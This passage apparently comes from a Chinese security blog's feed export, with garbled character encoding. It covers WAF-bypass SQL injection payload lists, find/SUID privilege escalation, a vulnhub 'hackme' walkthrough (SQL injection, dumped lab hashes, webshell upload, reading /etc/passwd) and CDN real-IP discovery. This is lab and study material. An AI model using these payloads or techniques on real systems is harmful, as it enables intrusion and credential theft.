class="line">+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line">+â€™UnIâ€Onâ€™+&#x27;SeLâ€ECTâ€™</span><br><span class="line">+uni on+sel ect+</span><br><span class="line">+/*!UnIoN*/+/*!SeLeCt*/+</span><br><span class="line">/*!u%6eion*/ /*!se%6cect*/</span><br><span class="line">uni%20union%20/*!select*/%20</span><br><span class="line">union%23aa%0Aselect</span><br><span class="line">/**/union/*!50000select*/</span><br><span class="line">/^.*union.*$/ /^.*select.*$/</span><br><span class="line">/*union*/union/*select*/select+</span><br><span class="line">/*uni X on*/union/*sel X ect*/</span><br><span class="line">+un/**/ion+sel/**/ect+</span><br><span class="line">+UnIOn%0d%0aSeleCt%0d%0a</span><br><span class="line">UNION/*&amp;test=1*/SELECT/*&amp;pwn=2*/</span><br><span class="line">un?&lt;ion sel=&quot;&quot;&gt;+un/**/ion+se/**/lect+</span><br><span class="line">+UNunionION+SEselectLECT+</span><br><span class="line">+uni%0bon+se%0blect+</span><br><span class="line">%252f%252a*/union%252f%252a /select%252f%252a*/</span><br><span class="line">/%2A%2A/union/%2A%2A/select/%2A%2A/</span><br><span class="line">%2f**%2funion%2f**%2fselect%2f**%2f</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">/*!UnIoN*/SeLecT+</span><br></pre></td></tr></table></figure>

<h3 id="Concat"><a href="#Concat" class="headerlink" title="Concat"></a>Concat</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CoNcAt()</span><br><span class="line">concat() </span><br><span class="line">CON%08CAT()</span><br><span class="line">CoNcAt()</span><br><span class="line">%0AcOnCat()</span><br><span class="line">/**//*!12345cOnCat*/</span><br><span class="line">/*!50000cOnCat*/(/*!*/)</span><br><span class="line">unhex(hex(concat(table_name)))</span><br><span class="line">unhex(hex(/*!12345concat*/(table_name)))</span><br><span class="line">unhex(hex(/*!50000concat*/(table_name)))</span><br></pre></td></tr></table></figure>

<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!group_concat*/()</span><br><span class="line">gRoUp_cOnCAt()</span><br><span class="line">group_concat(/*!*/)</span><br><span class="line">group_concat(/*!12345table_name*/)</span><br><span class="line">group_concat(/*!50000table_name*/)</span><br><span class="line">/*!group_concat*/(/*!12345table_name*/)</span><br><span class="line">/*!group_concat*/(/*!50000table_name*/)</span><br><span class="line">/*!12345group_concat*/(/*!12345table_name*/)</span><br><span class="line">/*!50000group_concat*/(/*!50000table_name*/)</span><br><span class="line">/*!GrOuP_ConCaT*/()</span><br><span class="line">/*!12345GroUP_ConCat*/()</span><br><span class="line">/*!50000gRouP_cOnCaT*/()</span><br><span class="line">/*!50000Gr%6fuP_c%6fnCAT*/()</span><br><span class="line">unhex(hex(group_concat(table_name)))</span><br><span class="line">unhex(hex(/*!group_concat*/(/*!table_name*/)))</span><br><span class="line">unhex(hex(/*!12345group_concat*/(table_name)))</span><br><span class="line">unhex(hex(/*!12345group_concat*/(/*!table_name*/)))</span><br><span class="line">unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))</span><br><span class="line">unhex(hex(/*!50000group_concat*/(table_name)))</span><br><span class="line">unhex(hex(/*!50000group_concat*/(/*!table_name*/)))</span><br><span class="line">unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))</span><br><span class="line">convert(group_concat(table_name)+using+ascii)</span><br><span class="line">convert(group_concat(/*!table_name*/)+using+ascii)</span><br><span class="line">convert(group_concat(/*!12345table_name*/)+using+ascii)</span><br><span class="line">convert(group_concat(/*!50000table_name*/)+using+ascii)</span><br><span class="line">CONVERT(group_concat(table_name)+USING+latin1)</span><br></pre></td></tr></table></figure>

<h3 id="Information-schema-tables"><a href="#Information-schema-tables" class="headerlink" title="Information_schema.tables"></a>Information_schema.tables</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -</span><br><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -</span><br><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -</span><br><span class="line">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -</span><br><span class="line">/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table</span><br><span class="line">/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table</span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92">https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92</a></p>
<p><a href="https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad">https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad</a></p>
</blockquote>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>findå‘½ä»¤ä¸ææƒ</title>
    <url>/posts/355e240e/</url>
    <content><![CDATA[<h3 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>â€“help  -help</td>
<td>å¸®åŠ©</td>
</tr>
<tr>
<td>-name</td>
<td>æŒ‰æ–‡ä»¶åæŸ¥æ‰¾</td>
</tr>
<tr>
<td>-iname</td>
<td>æ•ˆæœä¸-nameç±»ä¼¼ï¼Œä½†å¿½ç•¥å­—ç¬¦å¤§å°å†™</td>
</tr>
<tr>
<td>-type</td>
<td>åªå¯»æ‰¾ç¬¦åˆæŒ‡å®šçš„æ–‡ä»¶ç±»å‹çš„æ–‡ä»¶,  d ç›®å½•       f æ–‡ä»¶        c å­—ç¬¦è®¾å¤‡æ–‡ä»¶         b å—è®¾å¤‡æ–‡ä»¶</td>
</tr>
<tr>
<td>-print</td>
<td>å°†æ–‡ä»¶æˆ–ç›®å½•åç§°åˆ—å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚æ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªåç§°ï¼Œæ¯ä¸ªåç§°å‰çš†æœ‰â€./â€œå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>-prune</td>
<td>å¦‚æœæ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå°±ä¸ä¼šè¿›å…¥æ­¤ç›®å½•</td>
</tr>
<tr>
<td>-size n</td>
<td>næ˜¯æ–‡ä»¶å¤§å°å•ä½</td>
</tr>
<tr>
<td>-perm</td>
<td>æŒ‰ç…§æ–‡ä»¶æƒé™æ¥æŸ¥æ‰¾æ–‡ä»¶ï¼Œ4000ï¼Œ2000,1000ä¸ºåˆ†åˆ«è¡¨ç¤ºSUID,SGID,SBITï¼Œå¦‚777ä¸ºæ™®é€šæ–‡ä»¶çš„æœ€é«˜æƒé™ï¼Œ7000ä¸ºç‰¹æ®Šæ–‡ä»¶çš„æœ€é«˜æƒé™</td>
</tr>
<tr>
<td>-exec</td>
<td>findå‘½ä»¤å¯¹åŒ¹é…çš„æ–‡ä»¶æ‰§è¡Œè¯¥å‚æ•°æ‰€ç»™å‡ºçš„shellå‘½ä»¤ã€‚ç›¸åº”å‘½ä»¤çš„å½¢å¼ä¸ºâ€™commandâ€™ { } ;ï¼Œæ³¨æ„{ }å’Œ\ï¼›ä¹‹é—´çš„ç©ºæ ¼</td>
</tr>
</tbody></table>
<p>å®ä¾‹</p>
<p><code>find .</code> åˆ—å‡ºå½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</p>
<p><code>find .  -name  &quot;*-txt&quot;</code>  æ‰¾å‡ºå½“å‰æ–‡ä»¶åŠ ä¸‹çš„.txtæ–‡ä»¶</p>
<p><code>find . -nmae &quot;*.txt&quot; -o -name &quot;*.py&quot;</code> æ‰¾å‡ºå½“å‰æ–‡ä»¶å¤¹ä¸‹çš„.txtæ–‡ä»¶å’Œå­ç›®å½•ä¸‹çš„.pyæ–‡ä»¶</p>
<p><code>find . ! -name  &quot;*-txt&quot; </code> æ‰¾å‡ºå½“å‰ç›®å½•ä¸‹ä¸ä¸º.txtçš„æ–‡ä»¶</p>
<p><code>find . -type &lt;ç±»å‹å‚æ•°&gt;</code></p>
<table>
<thead>
<tr>
<th>ç±»å‹å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>f</td>
<td>æ™®é€šæ–‡ä»¶</td>
</tr>
<tr>
<td>d</td>
<td>ç›®å½•</td>
</tr>
<tr>
<td>p</td>
<td>ç®¡é“FIFO</td>
</tr>
<tr>
<td>s</td>
<td>å¥—æ¥å­—</td>
</tr>
<tr>
<td>l</td>
<td>ç¬¦å·è¿æ¥</td>
</tr>
<tr>
<td>b</td>
<td>å—è®¾å¤‡</td>
</tr>
<tr>
<td>c</td>
<td>å­—ç¬¦è®¾å¤‡</td>
</tr>
</tbody></table>
<p><code>find . -type f -name &quot;*-txt&quot;  -delete </code> åˆ é™¤åŒ¹é…çš„txtæ–‡ä»¶</p>
<p><code>find  -perm -777  -type f | sort</code> æŸ¥æ‰¾æƒé™ä¸º777çš„æ–‡ä»¶æˆ–ç›®å½•å¹¶æ’åº</p>
<p><code>find -type f -name &quot;*.txt&quot; -exec cat &#123;&#125; \; &gt; all.txt</code> å°†æ‰€æœ‰çš„txtæ–‡ä»¶æ‹¼æ¥å¹¶å†™å…¥åˆ°all.txt</p>
<p>å•è¡Œå‘½ä»¤çš„-execæ— æ³•æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œæ‰§è¡Œå¤šè¡Œå‘½ä»¤çš„è¯å°±éœ€è¦åˆ›å»ºä¸€ä¸ªtest.sh  è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ç»™777æƒé™ <code>chmod 777 test.sh</code></p>
<p>test.sh å†…å®¹ä¸ºä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat all.txt</span><br></pre></td></tr></table></figure>

<p><code>find &#39;all.txt&#39; -exec  ./test.sh  &#123;&#125; \;</code></p>
<p><img src="/posts/355e240e/find_exec_sh.png"></p>
<h3 id="2-gt-dev-null"><a href="#2-gt-dev-null" class="headerlink" title="2&gt; /dev/null"></a>2&gt; /dev/null</h3><br>

<p>æ–‡ä»¶æè¿°ç¬¦</p>
<p>0    æ ‡å‡†è¾“å…¥(stdin)</p>
<p>1    æ ‡å‡†è¾“å‡º(stdout)</p>
<p>2    æ ‡å‡†é”™è¯¯(stderror)</p>
<p>é‡å®šå‘</p>
<p><code>&gt;</code> æ¸…ç©ºæ–‡ä»¶ å†å†™å…¥å†…å®¹</p>
<p><code>&gt;&gt;</code> è¿½åŠ åˆ°æ–‡ä»¶å°¾éƒ¨</p>
<p><code>2&gt;/dev/null</code><br>æ„æ€å°±æ˜¯æŠŠé”™è¯¯è¾“å‡ºåˆ°â€œé»‘æ´â€</p>
<p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
<p>é»˜è®¤æƒ…å†µæ˜¯1ï¼Œä¹Ÿå°±æ˜¯ç­‰åŒäº1&gt;/dev/null 2&gt;&amp;1ã€‚æ„æ€å°±æ˜¯æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°â€œé»‘æ´â€ï¼Œè¿˜æŠŠé”™è¯¯è¾“å‡º2é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º1ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºéƒ½è¿›äº†â€œé»‘æ´â€<br><code>2&gt;&amp;1 &gt;/dev/null</code><br>æ„æ€å°±æ˜¯æŠŠé”™è¯¯è¾“å‡º2é‡å®šå‘åˆ°æ ‡å‡†å‡ºä¹¦1ï¼Œä¹Ÿå°±æ˜¯å±å¹•ï¼Œæ ‡å‡†è¾“å‡ºè¿›äº†â€œé»‘æ´â€ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºè¿›äº†é»‘æ´ï¼Œé”™è¯¯è¾“å‡ºæ‰“å°åˆ°å±å¹•</p>
<h3 id="Linuxä¸‹çš„æƒé™"><a href="#Linuxä¸‹çš„æƒé™" class="headerlink" title="Linuxä¸‹çš„æƒé™"></a>Linuxä¸‹çš„æƒé™</h3><p>Linuxä¸‹æƒé™çš„å±ç»„æœ‰ æ‹¥æœ‰è€… ã€ç¾¤ç»„ ã€å…¶å®ƒç»„ ä¸‰ç§ï¼Œè®¾ç½®ä¸åŒçš„rwxæƒé™ã€‚</p>
<p>Linuxä¸‹æ–‡ä»¶çš„æƒé™ç±»å‹ä¸€èˆ¬åŒ…æ‹¬è¯»ï¼Œå†™ï¼Œæ‰§è¡Œï¼Œå³rï¼Œwï¼Œxã€‚</p>
<blockquote>
<p>r=4ï¼Œw=2ï¼Œx=1<br>rwx = 4 + 2 + 1 = 7<br>rw = 4 + 2 = 6<br>rx = 4 +1 = 5</p>
</blockquote>
<p>ä¸€èˆ¬è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶æ‰€æœ‰æƒé™è¯¦æƒ…çš„æœ‰ä¸¤ç§æ–¹å¼</p>
<p>ä¸€ç§æ˜¯åè¿›åˆ¶ï¼Œåè¿›åˆ¶çš„å¸¸ç”¨è¡¨ç¤ºå½¢å¼</p>
<blockquote>
<p>-rwâ€”â€”- (600)    åªæœ‰æ‹¥æœ‰è€…æœ‰è¯»å†™æƒé™ã€‚<br>-rw-râ€“râ€“ (644)    åªæœ‰æ‹¥æœ‰è€…æœ‰è¯»å†™æƒé™ï¼›è€Œå±ç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªæœ‰è¯»æƒé™ã€‚<br>-rwxâ€”â€” (700)    åªæœ‰æ‹¥æœ‰è€…æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€‚<br>-rwxr-xr-x (755)    æ‹¥æœ‰è€…æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼›è€Œå±ç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªæœ‰è¯»ã€æ‰§è¡Œæƒé™ã€‚<br>-rwxâ€“xâ€“x (711)    æ‹¥æœ‰è€…æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼›è€Œå±ç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªæœ‰æ‰§è¡Œæƒé™ã€‚<br>-rw-rw-rw- (666)    æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰æ–‡ä»¶è¯»ã€å†™æƒé™ã€‚<br>-rwxrwxrwx (777)    æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€‚</p>
</blockquote>
<p>å¦ä¸€ç§æ˜¯åäºŒè¿›åˆ¶</p>
<p>linuxé™¤äº†è®¾ç½®æ­£å¸¸çš„è¯»å†™æ“ä½œæƒé™å¤–ï¼Œè¿˜æœ‰å…³äºä¸€ç±»è®¾ç½®ä¹Ÿæ˜¯æ¶‰åŠåˆ°æƒé™ï¼Œå«åšLinxué™„åŠ æƒé™ã€‚åŒ…æ‹¬ SETä½æƒé™ï¼ˆsuidï¼Œsgidï¼‰å’Œç²˜æ»ä½æƒé™ï¼ˆstickyï¼‰</p>
<p>sæƒé™(SetUIDï¼ŒSetGID)</p>
<p>SetUID    åªèƒ½åº”ç”¨äºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶*</p>
<p>SetGID    å¯åº”ç”¨äºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶*å’Œç›®å½•</p>
<p>4ä»£è¡¨SetUIDï¼Œ2ä»£è¡¨SetGIDï¼Œ6åˆ™æ˜¯ä¸¤è€…éƒ½ç½®ä½</p>
<p><code>chmod 4777 xxx</code></p>
<p><code>chmod 2777 xxx</code></p>
<p><code>chmod 6777 xxx</code></p>
<p><code>chmod </code></p>
<br>

<h3 id="findææƒ"><a href="#findææƒ" class="headerlink" title="findææƒ"></a>findææƒ</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45596239/article/details/102844386">https://blog.csdn.net/weixin_45596239/article/details/102844386</a><br><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">https://blog.csdn.net/weixin_44912169/article/details/105845909</a><br><a href="https://blog.csdn.net/gramdog/article/details/80374119">https://blog.csdn.net/gramdog/article/details/80374119</a><br><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ææƒ</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-hackmeé¶æœº</title>
    <url>/posts/9f82d7d9/</url>
    <content><![CDATA[<p>å°±ç®€å•å†™å†™æ€è·¯ï¼Œæœ€è¿‘å¼€å§‹å®ä¹ äº†ï¼Œä¹Ÿæ²¡å¤šå°‘æ—¶é—´å»å†™è¿™ç§é¶åœºçš„ç¬”è®°äº†</p>
<h3 id="è·å–é¶æœºip"><a href="#è·å–é¶æœºip" class="headerlink" title="è·å–é¶æœºip"></a>è·å–é¶æœºip</h3><p><code>arp-scan -l</code> è·å–é¶æœºçš„ip ä¸º 192.168.0.198</p>
<h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p><code>nmap -sV 192.168.0.198</code></p>
<p>å¼€æ”¾äº†22 80ç«¯å£</p>
<h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p>ä½¿ç”¨dirsearchæ‰«æç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">39:05] 200 -    0B  - /config.php                                          </span><br><span class="line">[17:39:07] 200 -  100B  - /index.php                                                         </span><br><span class="line">[17:39:07] 200 -  100B  - /index.php/login/</span><br><span class="line">[17:39:08] 200 -    1KB - /login.php                                                       </span><br><span class="line">[17:39:08] 302 -    0B  - /logout.php  -&gt;  login.php</span><br><span class="line">[17:39:10] 200 -    2KB - /register.php                                                     </span><br><span class="line">[17:39:10] 403 -  302B  - /server-status/                                              </span><br><span class="line">[17:39:10] 403 -  301B  - /server-status</span><br><span class="line">[17:39:11] 301 -  316B  - /uploads  -&gt;  http://192.168.0.198/uploads/                     </span><br><span class="line">[17:39:11] 200 -  940B  - /uploads/                     </span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸‹ <code>/uploads</code> çœ‹åˆ°é‡Œé¢å†…å®¹ä¸ºä¸Šä¼ </p>
<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>è®¿é—®ä¸‹80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªæ³¨å†Œç™»å½•æ¡†</p>
<p>æ³¨å†Œåç™»å½• æœ‰ä¸€ä¸ªæœç´¢åŠŸèƒ½ï¼Œæµ‹è¯•äº†ä¸‹å‘ç°æœ‰sqlæ³¨å…¥</p>
<p><code>a&#39; or 1=1 #</code>  è¿™é‡Œ<code>--+ </code>ä¸å¯ä»¥ï¼Œ<code>-- </code> å¯ä»¥</p>
<p>ä½¿ç”¨order by æ²¡æœ‰å›æ˜¾</p>
<p>ç›´æ¥ä½¿ç”¨union select è¯•ä¸‹æœ‰å‡ ä¸ªå­—æ®µ</p>
<p><code>a&#39; union select 1,2,3-- a</code> å‘ç°æœ‰ä¸‰ä¸ªå­—æ®µ</p>
<p><code>a%27+union+select+version%28%29%2Cdatabase%28%29%2C@@datadir--+a</code></p>
<p>åˆ†åˆ«å¾—åˆ° <code>5.7.25-0ubuntu0.18.10.2  </code> <code> webapphacking</code> <code> /var/lib/mysql/ SG</code></p>
<p><code>a&#39; union SELECT table_name,2,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE();-- </code></p>
<p>å¾—åˆ°<code>users</code> å’Œ <code>books</code>ä¸¤ä¸ªè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| Column  | Type                 |</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| user    | varchar(30)          |</span><br><span class="line">| address | varchar(50)          |</span><br><span class="line">| id      | smallint(5) unsigned |</span><br><span class="line">| name    | varchar(30)          |</span><br><span class="line">| pasword | varchar(70)          |</span><br><span class="line">+---------+----------------------+</span><br></pre></td></tr></table></figure>

<p>   dumpå¾—åˆ°è´¦æˆ·å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">superDatabase: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| id | name         | user       | address        | pasword                                     |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |</span><br><span class="line">| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |</span><br><span class="line">| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |</span><br><span class="line">| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |</span><br><span class="line">| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 13 | testtest     | testtest   | testtest       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™æ¡superadminçš„å¯†ç  sqlmapæ²¡æœ‰è§£å‡ºæ¥  </p>
<p><a href="https://crackstation.net/">https://crackstation.net/</a> å¯ä»¥è¿›è¡Œç ´è§£ æœ€ç»ˆå¾—åˆ°å¯†ç ä¸º <code>Uncrackable</code>(ç”¨å›½å†…çš„æ²¡è§£å‡ºæ¥)</p>
<p>ä½¿ç”¨superadminè¿›è¡Œç™»å½•ï¼Œç™»é™†åå‘ç°æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½</p>
<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>ä½¿ç”¨èšå‰‘ç›´æ¥ç”Ÿæˆshell.phpä¸Šä¼ å°±å¯ä»¥è¿æ¥ï¼Œè¿™é‡Œæ²¡æœ‰åšé˜²æŠ¤</p>
<p>å¾—åˆ°www-dataæƒé™</p>
<p><code>cat /etc/passwd</code></p>
<p>åé¢å‘ç°ä¸»æœºä¸Šæœ‰ä¸¤ä¸ªç”¨æˆ· åˆ†åˆ«ä¸º<code>hackme</code> å’Œ<code> legacy</code></p>
<p>åœ¨legacyç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ è¿è¡Œåå‘ç°æ²¡ååº”ï¼Œåç»­çœ‹äº†ä¸‹æœ€åæ˜¯é€šè¿‡è¿™ä¸ªæ–‡ä»¶è¿›è¡Œææƒçš„ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå´ç”¨ä¸äº†ï¼Œç”¨ä¸äº†å°±ç®—äº†ï¼Œè¿™ä¸ªé¶æœºè¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼Œå°±ä¸€ä¸ªsqlæ³¨å…¥ï¼Œæœ€è¿‘ä¸€ç›´åœ¨å®ä¹ ï¼Œä¹Ÿæ²¡ä»€ä¹ˆæ—¶é—´ï¼Œå‘¨æœ«æœ‰æ—¶é—´çš„è¯å°±çœ‹çœ‹æ–‡ç« ï¼Œå¤ç°ä¸‹æ¼æ´ï¼Œæ‰“æ‰“é¶åœºå•¥çš„ï¼Œå¼Ÿå¼Ÿå¤ªèœäº†ï¼ŒåŠªåŠ›å‘€ï¼</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CDNç»•è¿‡æŸ¥æ‰¾çœŸå®IP</title>
    <url>/posts/619fb955/</url>
    <content><![CDATA[<h3 id="é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN"><a href="#é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN" class="headerlink" title="é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN"></a>é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN</h3><h4 id="ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping-çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€"><a href="#ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping-çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€" class="headerlink" title="ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€"></a>ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
<h3 id="ç»•è¿‡CDNæŸ¥çœŸå®IP"><a href="#ç»•è¿‡CDNæŸ¥çœŸå®IP" class="headerlink" title="ç»•è¿‡CDNæŸ¥çœŸå®IP"></a>ç»•è¿‡CDNæŸ¥çœŸå®IP</h3><h4 id="æŸ¥å†å²CDNè®°å½•"><a href="#æŸ¥å†å²CDNè®°å½•" class="headerlink" title="æŸ¥å†å²CDNè®°å½•"></a>æŸ¥å†å²CDNè®°å½•</h4><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> æŸ¥è¯¢DNS</p>
<p><a href="https://sitereport.netcraft.com/?url=">https://sitereport.netcraft.com/?url=</a> </p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<h4 id="æŸ¥è¯¢å­åŸŸå"><a href="#æŸ¥è¯¢å­åŸŸå" class="headerlink" title="æŸ¥è¯¢å­åŸŸå"></a>æŸ¥è¯¢å­åŸŸå</h4><p>æœ‰äº›ç½‘ç«™å¯èƒ½åªä¼šå¯¹ä¸»ç«™æˆ–éƒ¨åˆ†å¤§æµé‡å­ç«™åšCDNï¼Œè€Œå¾ˆå¤šå°ç«™æˆ–è€…å­ç«™åˆšå¥½åˆå’Œä¸»ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨æˆ–è€…åŒä¸€ä¸ªCç«¯ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡æŸ¥æ‰¾å­åŸŸåæ¥å¯»æ‰¾çœŸå®ip</p>
<h5 id="åœ¨çº¿å­åŸŸåæœºå™¨"><a href="#åœ¨çº¿å­åŸŸåæœºå™¨" class="headerlink" title="åœ¨çº¿å­åŸŸåæœºå™¨"></a>åœ¨çº¿å­åŸŸåæœºå™¨</h5><p><code>https://dnsdb.io/zh-cn/</code> è¾“å…¥ baidu.com type:A å°±å¯ä»¥æœé›†å…¶å­åŸŸåå’Œip</p>
<h5 id="googleè¯­æ³•"><a href="#googleè¯­æ³•" class="headerlink" title="googleè¯­æ³•"></a>googleè¯­æ³•</h5><p><code>site:baidu.com -www</code>  å¯ä»¥æŸ¥çœ‹æ’é™¤wwwçš„å­åŸŸå</p>
<h5 id="å­åŸŸåæ‰«æå™¨"><a href="#å­åŸŸåæ‰«æå™¨" class="headerlink" title="å­åŸŸåæ‰«æå™¨"></a>å­åŸŸåæ‰«æå™¨</h5><ul>
<li>layerå­åŸŸåæŒ–æ˜æœº</li>
<li>lijiejieçš„subdomainbrute</li>
</ul>
